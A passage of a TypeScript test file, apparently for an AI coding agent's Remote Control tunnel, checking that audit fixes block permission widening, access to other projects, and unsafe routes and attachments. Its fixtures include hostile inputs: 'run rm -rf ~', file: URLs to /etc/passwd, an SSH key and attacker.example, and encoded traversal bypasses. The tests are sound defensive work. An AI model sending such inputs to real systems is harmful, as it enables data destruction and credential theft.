    expect(ok("/file/content?directory=/home/u/projX")).toBe(false)
    expect(ok("/config?location%5Bdirectory%5D=/home/u/Downloads/x")).toBe(false)
    expect(ok("/config", { "X-Opencode-Directory": "/home/u/.local/share/praex" })).toBe(false)
    expect(ok("/config", { "x-opencode-directory": "/home/u/proj" })).toBe(true)
  })
})

describe("17 Nov audit 12 A12-01: session permission rules can not be widened over Remote Control", () => {
  const status = (m: string, p: string, b?: unknown) => {
    const r = checkRemotePath(p, m, b === undefined ? undefined : new TextEncoder().encode(JSON.stringify(b)))
    return r.ok ? 200 : r.status
  }
  const allowAll = [{ permission: "*", pattern: "*", action: "allow" }]
  const guard = { permission: "destructive", pattern: "*", action: "ask" }
  const updatePaths = ["/session/ses_1", "/session/ses_1/", "/api/session/ses_1", "/SESSION/ses_1", "/%73ession/ses_1", "/session/x/../ses_1", "/session//ses_1", "/session/ses_1?directory=%2Ftmp"]
  // 22 Nov (audit 13): "/api/session" left this list; creating a session through the newer API is refused outright
  const createPaths = ["/session", "/session/", "/Session", "/%73ession", "/session/x/..", "/session?directory=%2Ftmp"]

  test("a session update that sets permission is refused on every spelling, whatever the rules say", () => {
    for (const path of updatePaths) {
      for (const permission of [allowAll, [guard], [{ permission: "bash", pattern: "*", action: "deny" }], "allow", { bash: "allow" }])
        expect({ path, permission, status: status("PATCH", path, { permission }) }).toEqual({ path, permission, status: 403 })
      expect({ path, status: status("PATCH", path, { title: "t", permission: allowAll }) }).toEqual({ path, status: 403 })
    }
    const r = checkRemotePath("/session/ses_1", "PATCH", new TextEncoder().encode(JSON.stringify({ permission: allowAll })))
    expect(r).toEqual({ ok: false, status: 403, message: expect.stringContaining("Permission rules") })
    // duplicate keys: JSON.parse keeps the last one, as the server does
    expect(status("PATCH", "/session/ses_1", undefined)).toBe(200)
    expect(checkRemotePath("/session/ses_1", "PATCH", new TextEncoder().encode('{"permission":[],"permission":[{"permission":"*","pattern":"*","action":"allow"}]}')).ok).toBe(false)
  })

  test("title, archive and metadata edits, and removing a session, still pass", () => {
    for (const path of updatePaths) {
      expect({ path, status: status("PATCH", path, { title: "Renamed" }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("PATCH", path, { time: { archived: 1 } }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("PATCH", path, { metadata: { pinned: true } }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("PATCH", path, { title: "t", permission: [] }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("DELETE", path) }).toEqual({ path, status: 200 })
    }
  })

  test("creating a session: allow rules are refused, ask and deny rules (the app's guard rule) pass", () => {
    for (const path of createPaths) {
      for (const permission of [allowAll, [guard, ...allowAll], [{ permission: "destructive", pattern: "*", action: "allow" }], [{ permission: "bash", pattern: "*" }], "allow", [null], {}])
        expect({ path, permission, status: status("POST", path, { permission }) }).toEqual({ path, permission, status: 403 })
      expect({ path, status: status("POST", path, { permission: [guard] }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path, { permission: [guard, { permission: "bash", pattern: "*", action: "deny" }] }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path, { title: "New" }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path) }).toEqual({ path, status: 200 })
    }
  })

  test("a prompt may turn tools off but not on", () => {
    for (const path of ["/session/ses_1/message", "/session/ses_1/prompt_async", "/api/session/ses_1/message", "/session/ses_1/prompt_async/", "/%73ession/ses_1/message", "/session/ses_1/PROMPT_ASYNC"]) {
      const parts = [{ type: "text", text: "hi" }]
      expect({ path, status: status("POST", path, { parts, tools: { bash: true } }) }).toEqual({ path, status: 403 })
      expect({ path, status: status("POST", path, { parts, tools: { websearch: false, bash: true } }) }).toEqual({ path, status: 403 })
      expect({ path, status: status("POST", path, { parts, tools: { bash: "yes" } }) }).toEqual({ path, status: 403 })
      expect({ path, status: status("POST", path, { parts, tools: { websearch: false, webfetch: false } }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path, { parts }) }).toEqual({ path, status: 200 })
    }
    expect(status("GET", "/session/ses_1/message")).toBe(200)
  })

  test("replaying sync events (which can carry a session's rules) is refused; other sync calls pass", () => {
    const events = [{ id: "e1", aggregateID: "ses_1", seq: 0, type: "session.updated", data: { sessionID: "ses_1", info: { permission: allowAll } } }]
    for (const path of ["/sync/replay", "/sync/replay/", "/api/sync/replay", "/%73ync/replay", "/sync/x/../replay"])
      expect({ path, status: status("POST", path, { directory: "/tmp/p", events }) }).toEqual({ path, status: 403 })
    // 22 Nov (audit 13): /sync/history was the passing example here; it is refused now (see the audit 13 tests).
    // 24 Nov: /sync/start too (the control plane's route, left open in 0.1.47); every sync route is the computer's.
    expect(status("POST", "/sync/start", {})).toBe(403)
  })

  test("over the wire: widening is refused before dispatch, a rename goes through", async () => {
    const { relay, tunnel, seen } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
    const send = (id: string, method: string, path: string, body?: unknown) =>
      ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
    send("w1", "PATCH", "/session/ses_1", { permission: allowAll })
    send("w2", "POST", "/session", { permission: allowAll })
    send("w3", "POST", "/session/ses_1/prompt_async", { parts: [], tools: { bash: true } })
    for (const id of ["w1", "w2", "w3"]) expect((await collect(relay, id)).status).toBe(403)
    expect(seen.length).toBe(0)
    send("w4", "PATCH", "/session/ses_1", { title: "Renamed" })
    send("w5", "POST", "/session", { permission: [guard] })
    for (const id of ["w4", "w5"]) expect((await collect(relay, id)).status).toBe(200)
    expect(seen.length).toBe(2)
  })
})

describe("17 Nov audit 12 A12-02: only this project's own worktrees are reachable", () => {
  test("projectWorktreeFolder is <data>/worktree/<project id>, and nothing for a project without one", () => {
    expect(projectWorktreeFolder("prj_1", "/data")).toBe(nodePath.join("/data", "worktree", "prj_1"))
    expect(projectWorktreeFolder("global", "/data")).toBeUndefined()
    expect(projectWorktreeFolder(undefined, "/data")).toBeUndefined()
    expect(projectWorktreeFolder("", "/data")).toBeUndefined()
    expect(projectWorktreeFolder("..", "/data")).toBeUndefined()
    expect(projectWorktreeFolder("../prj_2", "/data")).toBeUndefined()
  })

  test("another project's worktree is refused, this project's is allowed", () => {
    const root = "/home/u/proj"
    const mine = "/home/u/.local/share/praex/worktree/prj_1"
    const ok = (url: string, worktrees: string | null = mine, headers?: Record<string, string>) =>
      checkRemoteDirectory("http://opencode.internal" + url, headers, [root], worktrees ?? undefined)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_1/w1")).toBe(true)
    expect(ok("/file/content?directory=/home/u/.local/share/praex/worktree/prj_1/w1/src&path=a.ts")).toBe(true)
    expect(ok("/session", mine, { "x-opencode-directory": "/home/u/.local/share/praex/worktree/prj_1/w1" })).toBe(true)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_2/w1")).toBe(false)
    expect(ok("/session", mine, { "X-Opencode-Directory": "/home/u/.local/share/praex/worktree/prj_2/w1" })).toBe(false)
    expect(ok("/session?directory=%2Fhome%2Fu%2F.local%2Fshare%2Fpraex%2Fworktree%2Fprj_2%2Fw1")).toBe(false)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_1/../prj_2/w1")).toBe(false)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_10/w1")).toBe(false)
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree")).toBe(false)
    // a project without worktrees (no git) has no worktree folder at all
    expect(ok("/session?directory=/home/u/.local/share/praex/worktree/prj_1/w1", null)).toBe(false)
    expect(ok("/session?directory=/home/u/proj", null)).toBe(true)
  })

  test("relative folders are refused, and a relative root (a folder's name) allows nothing", () => {
    expect(checkRemoteDirectory("http://opencode.internal/session?directory=proj", undefined, ["/home/u/proj"], undefined)).toBe(false)
    expect(checkRemoteDirectory("http://opencode.internal/session?directory=" + encodeURIComponent(nodePath.resolve("proj")), undefined, "proj", undefined)).toBe(false)
    expect(checkRemoteDirectory("http://opencode.internal/session", undefined, "proj", undefined)).toBe(true)
  })

  test("a symlink inside this project's worktree folder that points at another project's worktree is refused", () => {
    const data = mkdtempSync(nodePath.join(os.tmpdir(), "praex-rc-a12-"))
    try {
      const mine = nodePath.join(data, "worktree", "prj_1")
      const theirs = nodePath.join(data, "worktree", "prj_2", "w1")
      mkdirSync(nodePath.join(mine, "w1"), { recursive: true })
      mkdirSync(theirs, { recursive: true })
      symlinkSync(theirs, nodePath.join(mine, "link"))
      const ok = (dir: string) => checkRemoteDirectory("http://opencode.internal/session?directory=" + encodeURIComponent(dir), undefined, ["/nonexistent/proj"], mine)
      expect(ok(nodePath.join(mine, "w1"))).toBe(true)
      expect(ok(theirs)).toBe(false)
      expect(ok(nodePath.join(mine, "link"))).toBe(false)
    } finally {
      rmSync(data, { recursive: true, force: true })
    }
  })

  test("over the wire: the scope's folder and own worktrees pass, another project's worktree gets the accurate refusal", async () => {
    const trees = "/tmp/praex-data/worktree/prj_1"
    const { relay, tunnel, seen } = make({ scope: async () => ({ roots: ["/tmp/praex-cli"], worktrees: trees }) })
    await tunnel.start()
    const ws = relay.sockets[0]
    const send = (id: string, path: string, headers: Record<string, string> = {}) =>
      ws.send(JSON.stringify({ t: "req", id, method: "GET", path, headers, auth: { idToken: "test:alice" } }))
    send("d1", "/session", { "x-opencode-directory": "/tmp/praex-cli" })
    send("d2", "/session?directory=/tmp/praex-data/worktree/prj_1/w1")
    send("d3", "/session?directory=/tmp/praex-data/worktree/prj_2/w1")
    send("d4", "/session", { "x-opencode-directory": "/tmp/praex-data/worktree/prj_2/w1" })
    expect((await collect(relay, "d1")).status).toBe(200)
    expect((await collect(relay, "d2")).status).toBe(200)
    for (const id of ["d3", "d4"]) {
      const r = await collect(relay, id)
      expect(r.status).toBe(403)
      expect(JSON.parse(r.body)).toEqual({ error: DIRECTORY_REFUSED })
    }
    expect(seen.length).toBe(2)
  })

  test("over the wire: a scope that fails to load allows no folder at all", async () => {
    const { relay, tunnel, seen } = make({ scope: async () => { throw new Error("lookup failed") } })
    await tunnel.start()
    const ws = relay.sockets[0]
    ws.send(JSON.stringify({ t: "req", id: "f1", method: "GET", path: "/session?directory=/tmp/praex-cli", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "f1")).status).toBe(403)
    ws.send(JSON.stringify({ t: "req", id: "f2", method: "GET", path: "/global/health", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "f2")).status).toBe(200)
    expect(seen.length).toBe(1)
  })
})

describe("22 Nov audit 13: TUI and sync routes, the newer API's session writes, subtask parts", () => {
  const json = (v: unknown) => new TextEncoder().encode(JSON.stringify(v))
  const status = (m: string, p: string, b?: unknown) => {
    const r = checkRemotePath(p, m, b === undefined ? undefined : json(b))
    return r.ok ? 200 : r.status
  }
  const hostOnly = "This can only be done on the computer, not over Remote Control."

  test("/tui, /sync/history and /sync/steal are refused for every method, however they are spelled", () => {
    const paths = [
      "/tui",
      "/tui/",
      "/tui/publish",
      "/tui/execute-command",
      "/tui/control/next",
      "/tui/append-prompt?directory=%2Ftmp",
      "/TUI/Publish",
      "/%74ui/publish",
      "/%2574ui/publish",
      "/tui//publish",
      "/session/../tui/publish",
      "/api/tui/publish",
      "/sync/history",
      "/sync/history/",
      "/sync/steal",
      "/SYNC/History",
      "/sync/%68istory",
      "/sync/%2568istory",
      "/sync//steal",
      "/sync/x/../steal",
      "/api/sync/history",
      "/api/sync/steal",
    ]
    for (const method of ["GET", "HEAD", "OPTIONS", "POST", "PUT", "PATCH", "DELETE", "PURGE"])
      for (const path of paths) expect({ method, path, status: status(method, path) }).toEqual({ method, path, status: 403 })
    expect(checkRemotePath("/tui/publish", "POST", json({ type: "tui.command.execute", properties: { command: "agent.cycle" } }))).toEqual({ ok: false, status: 403, message: hostOnly })
    expect(checkRemotePath("/sync/history", "POST", json({}))).toEqual({ ok: false, status: 403, message: hostOnly })
    expect(checkRemotePath("/tui/control/next", "GET")).toEqual({ ok: false, status: 403, message: hostOnly })
  })

  test("neighbouring routes still pass", () => {
    // 24 Nov: /sync/start is refused now (see the 24 Nov tests); /sync/startx is its neighbour
    for (const path of ["/tuix", "/session/x/tui", "/sync/startx", "/sync/historyx", "/sync", "/find/file?query=tui"])
      for (const method of ["GET", "POST"]) expect({ method, path, status: status(method, path) }).toEqual({ method, path, status: 200 })
  })

  test("the newer API: creating a session and prompting are refused, reads and permission and question replies pass", () => {
    for (const method of ["POST", "PUT", "PATCH", "DELETE", "PURGE"]) {
      for (const path of ["/api/session", "/api/session/", "/API/Session", "/api/%73ession", "/api//session", "/api/session?directory=%2Ftmp", "/api/session/ses_1/prompt", "/api/session/ses_1/prompt/", "/api/session/ses_1/PROMPT", "/api/session/ses_1/%70rompt", "/api/session/x/../ses_1/prompt"])
        expect({ method, path, status: status(method, path, {}) }).toEqual({ method, path, status: 403 })
    }
    expect(checkRemotePath("/api/session", "POST", json({ location: { directory: "/home/u/.ssh" } }))).toEqual({ ok: false, status: 403, message: hostOnly })
    // even with the ask rule the older route accepts
    expect(status("POST", "/api/session", { permission: [{ permission: "destructive", pattern: "*", action: "ask" }] })).toBe(403)
    // 24 Nov: the list (/api/session itself) is refused for reads too: it listed every project's sessions
    for (const path of ["/api/session", "/api/session/", "/api/session?project=prj_other", "/api/session?cursor=eyJ4IjoxfQ", "/API/Session"])
      for (const method of ["GET", "HEAD", "OPTIONS"]) expect({ method, path, status: status(method, path) }).toEqual({ method, path, status: 403 })
    for (const path of ["/api/session/ses_1", "/api/session/ses_1/message", "/api/session/ses_1/context", "/api/session/ses_1/permission", "/api/session/ses_1/question"])
      for (const method of ["GET", "HEAD", "OPTIONS"]) expect({ method, path, status: status(method, path) }).toEqual({ method, path, status: 200 })
    for (const path of ["/api/session/ses_1/permission/per_1/reply", "/api/session/ses_1/question/que_1/reply", "/api/session/ses_1/question/que_1/reject", "/api/session/ses_1/prompts"])
      expect({ path, status: status("POST", path, { reply: "once" }) }).toEqual({ path, status: 200 })
    // the older routes the phone app uses stay open
    expect(status("POST", "/session", { title: "New" })).toBe(200)
    expect(status("POST", "/session/ses_1/prompt_async", { parts: [{ type: "text", text: "hi" }] })).toBe(200)
  })

  test("a subtask part is refused on the prompt and command routes; other parts pass", () => {
    const subtask = { type: "subtask", agent: "general", description: "d", prompt: "run rm -rf ~" }
    const text = { type: "text", text: "hi" }
    for (const path of ["/session/ses_1/message", "/session/ses_1/prompt_async", "/session/ses_1/command", "/session/ses_1/command/", "/api/session/ses_1/message", "/SESSION/ses_1/Prompt_Async", "/%73ession/ses_1/command", "/session/ses_1/%63ommand", "/session//ses_1/message"]) {
      expect({ path, status: status("POST", path, { parts: [subtask] }) }).toEqual({ path, status: 403 })
      expect({ path, status: status("POST", path, { parts: [text, subtask] }) }).toEqual({ path, status: 403 })
      expect({ path, status: status("POST", path, { parts: [text] }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path, { parts: [text, { type: "agent", name: "general" }, { type: "file", mime: "image/png", url: "data:image/png;base64,AAAA" }] }) }).toEqual({ path, status: 200 })
      expect({ path, status: status("POST", path, { command: "review", arguments: "" }) }).toEqual({ path, status: 200 })
    }
    expect(checkRemotePath("/session/ses_1/prompt_async", "POST", json({ parts: [subtask] }))).toEqual({ ok: false, status: 403, message: SUBTASK_REFUSED })
    expect(SUBTASK_REFUSED).toBe("Subagent tasks can not be started over Remote Control.")
    // duplicate keys: JSON.parse keeps the last one, as the server does
    expect(checkRemotePath("/session/ses_1/command", "POST", new TextEncoder().encode('{"parts":[],"parts":[{"type":"subtask"}]}')).ok).toBe(false)
    // a command body that is not JSON is refused, so its parts can not go unread
    expect(status("POST", "/session/ses_1/command", undefined)).toBe(200)
    expect(checkRemotePath("/session/ses_1/command", "POST", new TextEncoder().encode("{not json"))).toEqual({ ok: false, status: 400, message: "Bad request body." })
  })
})

describe("22 Nov audit 13: files attached by file: url must be in the project", () => {
  test("a file: url must point into a root or this project's worktree folder; other urls pass", () => {
    const base = realpathSync(mkdtempSync(nodePath.join(os.tmpdir(), "praex-rc-a13-")))
    try {
      const root = nodePath.join(base, "proj")
      const trees = nodePath.join(base, "data", "worktree", "prj_1")
      const outside = nodePath.join(base, "home")
      mkdirSync(nodePath.join(root, "src"), { recursive: true })
      mkdirSync(nodePath.join(trees, "w1"), { recursive: true })
      mkdirSync(outside, { recursive: true })
      writeFileSync(nodePath.join(root, "src", "a.ts"), "export {}\n")
      writeFileSync(nodePath.join(outside, "id_ed25519"), "secret\n")
      symlinkSync(outside, nodePath.join(root, "link"))
      const file = (p: string) => ({ type: "file", mime: "text/plain", url: pathToFileURL(p).href })
      const ok = (body: unknown) => checkRemoteParts(body, [root], trees)

      expect(ok({ parts: [{ type: "text", text: "hi" }] })).toBe(true)
      expect(ok({ parts: [file(nodePath.join(root, "src", "a.ts"))] })).toBe(true)
      expect(ok({ parts: [{ ...file(nodePath.join(root, "src", "a.ts")), url: pathToFileURL(nodePath.join(root, "src", "a.ts")).href + "?start=1&end=2" }] })).toBe(true)
      expect(ok({ parts: [file(root)] })).toBe(true)
      expect(ok({ parts: [file(nodePath.join(root, "not-there-yet.ts"))] })).toBe(true)
      expect(ok({ parts: [file(nodePath.join(trees, "w1", "b.ts"))] })).toBe(true)
      expect(ok({ parts: [{ type: "file", mime: "image/png", url: "data:image/png;base64,AAAA" }] })).toBe(true)
      expect(ok({ parts: [{ type: "file", mime: "text/plain", url: "https://example.com/a.txt" }] })).toBe(true)
      expect(ok({ parts: [{ type: "file", mime: "text/plain", url: "not a url" }] })).toBe(true)
      expect(ok({ command: "review", arguments: "", parts: [file(nodePath.join(root, "src", "a.ts"))] })).toBe(true)

      const refused = [
        pathToFileURL(nodePath.join(outside, "id_ed25519")).href,
        "file:///etc/passwd",
        "FILE:///etc/passwd",
        "  file:///etc/passwd",
        "file:/etc/passwd",
        "file://localhost/etc/passwd",
        "file://attacker.example/etc/passwd",
        "file:///etc/passwd?start=1&end=2",
        // a symlink in the project that points out of it
        pathToFileURL(nodePath.join(root, "link", "id_ed25519")).href,
        // dot segments and encoded dot segments leave the project
        pathToFileURL(root).href + "/../home/id_ed25519",
        pathToFileURL(root).href + "/%2e%2e/home/id_ed25519",
        // an encoded slash can not be turned into a path at all
        pathToFileURL(root).href + "/src%2Fa.ts",
        // the sibling folder whose name starts the same, and the machine's whole worktree folder
        pathToFileURL(root + "X").href,
        pathToFileURL(nodePath.join(base, "data", "worktree", "prj_2", "w1", "b.ts")).href,
        pathToFileURL(trees).href,
      ]
      for (const url of refused) {
        expect({ url, ok: ok({ parts: [{ type: "file", mime: "text/plain", url }] }) }).toEqual({ url, ok: false })
        // one bad part among good ones is enough
        expect({ url, ok: ok({ parts: [file(nodePath.join(root, "src", "a.ts")), { type: "file", mime: "text/plain", url }] }) }).toEqual({ url, ok: false })
        // the body's own url counts too
        expect({ url, ok: ok({ url }) }).toEqual({ url, ok: false })
      }
      expect(ok({ url: pathToFileURL(nodePath.join(root, "src", "a.ts")).href })).toBe(true)
      // nothing to look at
      for (const body of [undefined, null, "text", 7, [], {}, { parts: "x" }, { parts: [null, 1, "s", {}] }, { url: 5 }]) expect(ok(body)).toBe(true)
      // a relative root (a folder's name) allows nothing, and no worktree folder means none is allowed
      expect(checkRemoteParts({ parts: [file(nodePath.join(root, "src", "a.ts"))] }, "proj", undefined)).toBe(false)
      expect(checkRemoteParts({ parts: [file(nodePath.join(trees, "w1", "b.ts"))] }, [root], undefined)).toBe(false)
    } finally {
      rmSync(base, { recursive: true, force: true })
    }
  })

  test("over the wire: a file part outside the project is refused before dispatch, on the prompt and command routes", async () => {
    const { relay, tunnel, seen, applied } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
    const send = (id: string, method: string, path: string, body?: unknown) =>
      ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
    const secret = { type: "file", mime: "text/plain", filename: "id_ed25519", url: "file:///home/u/.ssh/id_ed25519" }
    send("p1", "POST", "/session/ses_1/message", { noReply: true, parts: [secret] })
    send("p2", "POST", "/session/ses_1/prompt_async", { parts: [{ type: "text", text: "read this" }, secret] })
    send("p3", "POST", "/session/ses_1/command", { command: "review", arguments: "", parts: [secret] })
    send("p4", "POST", "/%73ession/ses_1/message", { noReply: true, parts: [secret] })
    for (const id of ["p1", "p2", "p3", "p4"]) {
      const r = await collect(relay, id)
      expect({ id, status: r.status }).toEqual({ id, status: 403 })
      expect(JSON.parse(r.body)).toEqual({ error: PARTS_REFUSED })
    }
    expect(seen.length).toBe(0)
    // refused before the session is touched at all
    expect(applied.length).toBe(0)
    send("p5", "POST", "/session/ses_1/prompt_async", { parts: [{ type: "file", mime: "text/plain", url: "file:///tmp/praex-cli/src/a.ts?start=3&end=9" }, { type: "file", mime: "image/png", url: "data:image/png;base64,AAAA" }] })
    expect((await collect(relay, "p5")).status).toBe(200)
    expect(seen.length).toBe(1)
  })
})

describe("22 Nov audit 13: requests are marked as coming over Remote Control", () => {
  test("x-praex-remote is set by the tunnel on every request, and what the phone sent under that name is dropped", async () => {
    const { relay, tunnel, seen, applied } = make()
    await tunnel.start()
    const ws = relay.sockets[0]
    const body = Buffer.from(JSON.stringify({ command: "review", arguments: "" })).toString("base64")
    ws.send(JSON.stringify({ t: "req", id: "m1", method: "POST", path: "/session/ses_1/command", headers: { "content-type": "application/json", "X-Praex-Remote": "0", "x-praex-remote": "no", "X-PRAEX-REMOTE": "" }, body, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "m1")).status).toBe(200)
    ws.send(JSON.stringify({ t: "req", id: "m2", method: "GET", path: "/session", headers: {}, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "m2")).status).toBe(200)
    ws.send(JSON.stringify({ t: "req", id: "m3", method: "GET", path: "/session", headers: { "x-praex-remote": "0", "x-other": "kept" }, auth: { idToken: "test:alice" } }))
    expect((await collect(relay, "m3")).status).toBe(200)
    expect(seen.map((r) => r.headers.get("x-praex-remote"))).toEqual(["1", "1", "1"])
    expect(seen[0].headers.get("content-type")).toBe("application/json")
    expect(seen[2].headers.get("x-other")).toBe("kept")
    // the tunnel's own permission mode update carries it too
    expect(applied.map((a) => a.headers.get("x-praex-remote"))).toEqual(["1"])
  })
})

describe("22 Nov audit 13: the computer's permission mode is put on a session before the model runs in it", () => {
  const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
  const sender = (ws: any) => (id: string, method: string, path: string, body?: unknown, headers: Record<string, string> = {}) =>
    ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json", ...headers }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
  const prompt = { parts: [{ type: "text", text: "hi" }] }

  test("remoteModelSession names the session of a prompt, command, init or summarize, and nothing else", () => {
    for (const path of ["/session/ses_1/message", "/session/ses_1/prompt_async", "/session/ses_1/command", "/session/ses_1/init", "/session/ses_1/summarize", "/session/ses_1/message/", "/SESSION/ses_1/Prompt_Async", "/session//ses_1/message", "/api/session/ses_1/message"])
      expect({ path, session: remoteModelSession(path) }).toEqual({ path, session: { id: "ses_1" } })
    expect(remoteModelSession("/session/01HX-abc_DEF/command")).toEqual({ id: "01HX-abc_DEF" })
    // a session id that is not a plain id, or a route that only shows after decoding
    for (const path of ["/session/ses%201/message", "/session/a%2Fb/prompt_async", "/session/ses_1%3Fx/command", "/session/ses.1/message", "/session/ses_1/%6dessage", "/%73ession/ses_1/message", "/session/ses_1/prompt%5Fasync", "/session/%2573es_1/init"])
      expect({ path, session: remoteModelSession(path) }).toEqual({ path, session: "bad" })
    for (const path of ["/session", "/session/ses_1", "/session/ses_1/abort", "/session/ses_1/fork", "/session/ses_1/messages", "/session/ses_1/message/msg_1", "/session/ses_1/permissions/per_1", "/permission/per_1/reply", "/global/health", "/file/100%25"])
      expect({ path, session: remoteModelSession(path) }).toEqual({ path, session: undefined })
  })

  test("the mode is applied once per session, before the phone's request, with the same query and headers", async () => {
    const order: string[] = []
    const { relay, tunnel, seen, applied } = make()
    const inner = (tunnel as any).opts.dispatch
    ;(tunnel as any).opts.dispatch = async (req: Request) => {
      order.push(`${req.method} ${new URL(req.url).pathname}`)
      return inner(req)
    }
    await tunnel.start()
    const send = sender(relay.sockets[0])
    send("a1", "POST", "/session/ses_1/prompt_async?directory=/tmp/praex-cli", prompt, { "x-opencode-directory": "/tmp/praex-cli", "content-length": "999" })
    expect((await collect(relay, "a1")).status).toBe(200)
    // 24 Nov: the tunnel first looks up the session's folder (GET), then puts the mode on it (PATCH)
    expect(order).toEqual(["GET /session/ses_1", "PATCH /session/ses_1", "POST /session/ses_1/prompt_async"])
    expect(applied).toHaveLength(1)
    expect(applied[0].path).toBe("/session/ses_1?directory=/tmp/praex-cli")
    // no mode option given: manual
    expect(applied[0].body).toEqual({ permission: PERMISSION_MODE_RULES.manual })
    expect(applied[0].body.permission).toEqual([
      ...["edit", "bash", "task", "webfetch", "websearch"].map((permission) => ({ permission, pattern: "*", action: "ask" })),
      { permission: "readonly", pattern: "*", action: "allow" },
      { permission: "destructive", pattern: "*", action: "ask" },
    ])
    expect(applied[0].headers.get("content-type")).toBe("application/json")
    expect(applied[0].headers.get("x-opencode-directory")).toBe("/tmp/praex-cli")
    // the phone's content-length belongs to the phone's body
    expect(applied[0].headers.get("content-length")).not.toBe("999")

    // the same session again, on every route that makes the model run: nothing more is sent
    send("a2", "POST", "/session/ses_1/message", prompt)
    send("a3", "POST", "/session/ses_1/command", { command: "review", arguments: "" })
    send("a4", "POST", "/session/ses_1/init", { providerID: "p", modelID: "m", messageID: "msg_1" })
    send("a5", "POST", "/session/ses_1/summarize", { providerID: "p", modelID: "m" })
    for (const id of ["a2", "a3", "a4", "a5"]) expect((await collect(relay, id)).status).toBe(200)
    expect(applied).toHaveLength(1)
    expect(seen).toHaveLength(5)

    // another session gets its own, whichever route comes first
    const others: Array<[string, string, unknown]> = [
      ["a6", "/session/ses_2/command/", { command: "review", arguments: "" }],
      ["a7", "/session/ses_3/init", { providerID: "p", modelID: "m", messageID: "msg_1" }],
      ["a8", "/SESSION/ses_4/Message", prompt],
      ["a9", "/session/ses_5/summarize", { providerID: "p", modelID: "m", auto: true }],
    ]
    for (const [id, path, body] of others) {
      send(id, "POST", path, body)
      expect((await collect(relay, id)).status).toBe(200)
    }
    expect(applied.map((a) => a.path)).toEqual(["/session/ses_1?directory=/tmp/praex-cli", "/session/ses_2", "/session/ses_3", "/session/ses_4", "/session/ses_5"])
  })

  test("a mode change on the computer is applied again on the next request; a mode that throws counts as manual", async () => {
    let mode: any = "auto"
    const { relay, tunnel, applied } = make({ mode: () => (mode === "throw" ? (() => { throw new Error("no mode") })() : mode) })
    await tunnel.start()
    const send = sender(relay.sockets[0])
    const ask = async (id: string) => {
      send(id, "POST", "/session/ses_1/prompt_async", prompt)
      expect((await collect(relay, id)).status).toBe(200)
    }
    await ask("c1")
    await ask("c2")
    expect(applied.map((a) => a.body)).toEqual([{ permission: PERMISSION_MODE_RULES.auto }])
    mode = "manual"
    await ask("c3")
    await ask("c4")
    mode = "auto"
    await ask("c5")
    mode = "throw"
    await ask("c6")
    await ask("c7")
    // a value that is not a mode is manual too, which is already on the session
    mode = "yolo"
    await ask("c8")
    expect(applied.map((a) => a.body)).toEqual([
      { permission: PERMISSION_MODE_RULES.auto },
      { permission: PERMISSION_MODE_RULES.manual },
      { permission: PERMISSION_MODE_RULES.auto },
      { permission: PERMISSION_MODE_RULES.manual },
    ])
    expect(PERMISSION_MODE_RULES.auto).toEqual([{ permission: "*", pattern: "*", action: "allow" }, { permission: "destructive", pattern: "*", action: "ask" }])
  })

  test("when the mode can not be applied the phone's request is not dispatched", async () => {
    let fail: "status" | "throw" | undefined = "status"
    const dispatched: string[] = []
    const { relay, tunnel } = make({
      dispatch: async (req) => {
        if (req.method === "PATCH") {
          if (fail === "throw") throw new Error("instance failed to load")
          return fail === "status" ? Response.json({ error: "not found" }, { status: 404 }) : Response.json(true)
        }
        dispatched.push(`${req.method} ${new URL(req.url).pathname}`)
        return Response.json(true)
      },
    })
    await tunnel.start()
    const send = sender(relay.sockets[0])
    send("f1", "POST", "/session/ses_1/prompt_async", prompt)
    const f1 = await collect(relay, "f1")
    expect(f1.status).toBe(503)
    expect(JSON.parse(f1.body)).toEqual({ error: MODE_REFUSED })
    fail = "throw"
    send("f2", "POST", "/session/ses_1/command", { command: "review", arguments: "" })
    const f2 = await collect(relay, "f2")
    expect(f2.status).toBe(503)
    expect(JSON.parse(f2.body)).toEqual({ error: MODE_REFUSED })
    expect(dispatched).toEqual([])
    // a failure is not remembered: the next request tries again, and goes through once the update works
    fail = undefined
    send("f3", "POST", "/session/ses_1/prompt_async", prompt)
    expect((await collect(relay, "f3")).status).toBe(200)
    expect(dispatched).toEqual(["POST /session/ses_1/prompt_async"])
    // other routes were never held up by it
    fail = "status"
    send("f4", "GET", "/session/ses_2/message")
    send("f5", "POST", "/session/ses_2/abort")
    for (const id of ["f4", "f5"]) expect((await collect(relay, id)).status).toBe(200)
  })

  test("a session id that is not a plain id, or an encoded spelling of the route, is refused as a bad path", async () => {
    const { relay, tunnel, seen, applied } = make()
    await tunnel.start()
    const send = sender(relay.sockets[0])
    const paths = ["/session/ses%201/message", "/session/a%2Fb/prompt_async", "/session/ses.1/command", "/session/ses_1/%6dessage", "/%73ession/ses_1/prompt_async", "/session/ses_1/%69nit", "/session/ses_1%3Fx/summarize"]
